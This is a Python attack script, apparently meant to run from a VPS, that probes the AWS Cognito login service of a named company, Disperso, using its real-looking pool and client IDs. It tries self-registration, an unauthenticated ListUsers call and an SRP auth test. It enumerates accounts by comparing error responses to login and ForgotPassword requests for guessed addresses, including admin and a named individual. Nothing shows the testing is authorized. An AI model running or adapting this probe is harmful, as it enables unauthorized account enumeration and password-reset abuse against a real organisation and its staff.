#!/usr/bin/env python3
"""Cognito probe for Disperso - run on VPS"""
import requests, json, sys

pool_id = 'us-east-2_SOCtEIx2s'
client_id = '4fjbm9cornhgfqk4o8m33rjt2f'
region = 'us-east-2'
cognito_url = f'https://cognito-idp.{region}.amazonaws.com/'

def cognito_req(target, payload, timeout=15):
    headers = {
        'Content-Type': 'application/x-amz-json-1.1',
        'X-Amz-Target': f'AWSCognitoIdentityProviderService.{target}',
    }
    r = requests.post(cognito_url, headers=headers, json=payload, timeout=timeout)
    return r.status_code, r.json()

# 1. SignUp probe
print('=== 1. SIGN-UP PROBE ===')
code, data = cognito_req('SignUp', {
    'ClientId': client_id,
    'Username': 'probe12345@yopmail.com',
    'Password': 'Probe12345!',
    'UserAttributes': [{'Name': 'email', 'Value': 'probe12345@yopmail.com'}]
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 2. InitiateAuth - user enum via error diff
print('\n=== 2. INITIATE AUTH (fake user) ===')
code, data = cognito_req('InitiateAuth', {
    'AuthFlow': 'USER_PASSWORD_AUTH',
    'ClientId': client_id,
    'AuthParameters': {'USERNAME': 'nonexistent_fake_1234@disperso.com', 'PASSWORD': 'WrongPass1!'}
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 3. InitiateAuth - possible real user
print('\n=== 3. INITIATE AUTH (admin@disperso.com) ===')
code, data = cognito_req('InitiateAuth', {
    'AuthFlow': 'USER_PASSWORD_AUTH',
    'ClientId': client_id,
    'AuthParameters': {'USERNAME': 'admin@disperso.com', 'PASSWORD': 'WrongPass1!'}
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 4. ForgotPassword for user enum
print('\n=== 4. FORGOT PASSWORD (admin@disperso.com) ===')
code, data = cognito_req('ForgotPassword', {
    'ClientId': client_id,
    'Username': 'admin@disperso.com',
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 5. ForgotPassword nonexistent
print('\n=== 5. FORGOT PASSWORD (nonexistent) ===')
code, data = cognito_req('ForgotPassword', {
    'ClientId': client_id,
    'Username': 'definitely_not_existing_1234@disperso.com',
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 6. ListUsers (unauthorized - test)
print('\n=== 6. LIST USERS (unauth test) ===')
code, data = cognito_req('ListUsers', {
    'UserPoolId': pool_id,
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 7. GetUser (no token)
print('\n=== 7. GET USER (no token) ===')
code, data = cognito_req('GetUser', {
    'AccessToken': 'fake_token_12345',
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 8. InitiateAuth SRP flow test
print('\n=== 8. SRP AUTH (test) ===')
code, data = cognito_req('InitiateAuth', {
    'AuthFlow': 'USER_SRP_AUTH',
    'ClientId': client_id,
    'AuthParameters': {'USERNAME': 'admin@disperso.com', 'SRP_A': 'a' * 512}
})
print(f'Status: {code}')
print(json.dumps(data, indent=2))

# 9. More email guesses
print('\n=== 9. USER ENUM - email guesses ===')
emails = [
    'info@disperso.com', 'soporte@disperso.com', 'admin@disperso.com',
    'contacto@disperso.com', 'test@disperso.com', 'dev@disperso.com',
    'jose@disperso.com', 'jose.bilbao@disperso.com',
]
for email in emails:
    code, data = cognito_req('ForgotPassword', {'ClientId': client_id, 'Username': email})
    err = data.get('__type', '').split('#')[-1]
    msg = data.get('message', '')[:80]
    print(f'  {email:40} => {code} {err}: {msg}')
